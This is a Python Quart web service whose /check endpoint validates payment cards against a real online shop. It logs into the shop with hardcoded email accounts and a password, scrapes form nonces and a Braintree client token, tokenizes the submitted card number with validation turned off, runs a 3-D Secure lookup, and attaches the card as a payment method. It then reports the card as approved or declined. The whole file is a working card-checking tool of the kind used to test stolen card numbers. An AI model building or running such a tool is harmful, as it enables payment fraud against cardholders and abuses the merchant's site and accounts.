from quart import Quart, request, jsonify
import aiohttp
import asyncio
import base64
import json
import random
import uuid

app = Quart(__name__)


def find_between(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None


def getAccountRandom():
    emails = [
        'aquabrandie@mechanicspedia.com',
        'bobbefuchsia@mechanicspedia.com',
        'pinkaubine@mechanicspedia.com'
    ]
    return random.choice(emails)


def generateSessionId():
    return str(uuid.uuid4())


@app.route('/check')
async def check_card():
    card = request.args.get("card")
    if not card or card.count("|") != 3:
        return jsonify({"error": "Invalid format. Use: CC|MM|YYYY|CVV"}), 400

    cc, mes, ano, cvv = card.split("|")

    async with aiohttp.ClientSession() as session:
        try:
            # Get IP
            ip_resp = await session.get('https://api.ipify.org?format=json')
            ip_json = await ip_resp.json()
            ip = ip_json['ip']

            # Login nonce
            result = await session.get('https://mamoi.me/my-account/orders/')
            nonce_login = find_between(await result.text(), 'name="woocommerce-login-nonce" value="', '"')
            email_acc = getAccountRandom()

            await session.post(
                'https://mamoi.me/my-account/orders/',
                data=f'username={email_acc}&password=ROberSmal123%24&woocommerce-login-nonce={nonce_login}&&_wp_http_referer=%2Fmy-account%2Forders%2F&login=Log+in',
                headers={'Content-Type': 'application/x-www-form-urlencoded'}
            )

            # Get Braintree token
            result = await session.get('https://mamoi.me/my-account/add-payment-method/')
            html = await result.text()
            braintree_token = find_between(html, 'var wc_braintree_client_token = ["', '"]')
            add_nonce = find_between(html, 'name="woocommerce-add-payment-method-nonce" value="', '"')

            decoded_token = json.loads(base64.b64decode(braintree_token).decode('utf-8'))
            bearer_token = decoded_token['authorizationFingerprint']
            merchantId = decoded_token['merchantId']

            # Tokenize card
            headers = {
                'Authorization': f'Bearer {bearer_token}',
                'Braintree-Version': '2018-05-10',
                'Content-Type': 'application/json',
                'Origin': 'https://assets.braintreegateway.com',
                'Referer': 'https://assets.braintreegateway.com/'
            }

            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': generateSessionId(),
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mes,
                            'expirationYear': ano,
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }

            result = await session.post('https://payments.braintree-api.com/graphql', json=json_data, headers=headers)
            data_result = await result.json()
            card_token = data_result.get('data', {}).get('tokenizeCreditCard', {}).get('token')

            if not card_token:
                return jsonify({"error": "Failed to tokenize card"}), 400

            # 3DS Lookup
            json_data = {
                'amount': '0.00',
                'browserColorDepth': 24,
                'browserJavaEnabled': False,
                'browserJavascriptEnabled': True,
                'browserLanguage': 'en-US',
                'browserScreenHeight': 1127,
                'browserScreenWidth': 1408,
                'browserTimeZone': 300,
                'deviceChannel': 'Browser',
                'bin': cc[:6],
                'dfReferenceId': f'0_{generateSessionId()}',
                'clientMetadata': {
                    'requestedThreeDSecureVersion': '2',
                    'sdkVersion': 'web/3.117.1',
                    'cardinalDeviceDataCollectionTimeElapsed': 3,
                    'issuerDeviceDataCollectionTimeElapsed': 2719,
                    'issuerDeviceDataCollectionResult': True,
                },
                'authorizationFingerprint': bearer_token,
                'braintreeLibraryVersion': 'braintree/web/3.117.1',
                '_meta': {
                    'merchantAppId': 'mamoi.me',
                    'platform': 'web',
                    'sdkVersion': '3.117.1',
                    'source': 'client',
                    'integration': 'custom',
                    'integrationType': 'custom',
                    'sessionId': generateSessionId(),
                },
            }

            result = await session.post(
                f'https://api.braintreegateway.com/merchants/{merchantId}/client_api/v1/payment_methods/{card_token}/three_d_secure/lookup',
                json=json_data,
                headers={'content-type': 'application/json'}
            )

            data_result = await result.json()
            enrolled = data_result.get('paymentMethod', {}).get('threeDSecureInfo', {}).get('enrolled')
            nonce = data_result.get('paymentMethod', {}).get('nonce')

            if not nonce:
                return jsonify({"error": "Failed 3D Secure Lookup"}), 400

            # Add method
            result = await session.post(
                'https://mamoi.me/my-account/add-payment-method/',
                data={
                    'payment_method': 'braintree_cc',
                    'braintree_cc_nonce_key': nonce,
                    'woocommerce-add-payment-method-nonce': add_nonce,
                    'woocommerce_add_payment_method': 1
                },
                headers={'content-type': 'application/x-www-form-urlencoded'}
            )

            result_text = await result.text()
            if 'Payment method successfully added.' in result_text:
                return jsonify({"status": "APPROVED ✅"})
            else:
                return jsonify({"status": "DECLINED ❌"})

        except Exception as e:
            return jsonify({"error": str(e)}), 500


if __name__ == "__main__":
    app.run()
